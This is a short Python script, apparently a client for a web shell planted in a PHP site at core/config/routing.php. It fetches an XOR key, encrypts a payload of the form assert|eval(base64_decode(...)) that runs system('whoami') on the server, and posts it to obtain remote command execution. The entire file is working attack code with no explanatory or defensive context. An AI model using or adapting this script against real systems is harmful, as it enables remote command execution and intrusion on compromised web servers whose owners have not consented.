import requests
import sys
import os
import re 
import base64
host = "http://192.168.1.20/core/config/routing.php"
pwd = 'pass'
cmd = "assert|eval(base64_decode('ZWNobyBzeXN0ZW0oJ3dob2FtaScpOw=='));"
def jiami(key,text):
    miwen = ''
    for i in range(0,len(text)):
        miwen = miwen+chr(ord(text[i])^ord(key[((i+1)&15)]))
    return base64.b64encode(miwen.encode("utf-8"))
s = requests.Session()
url = host+"?"+pwd+"=123"
print(url)
key = s.get(url).text
print(key)
miwen  = str(jiami(key,cmd))[2:-1]
print(miwen)
payload = miwen
req = s.post(host,data=payload)
print(req.content)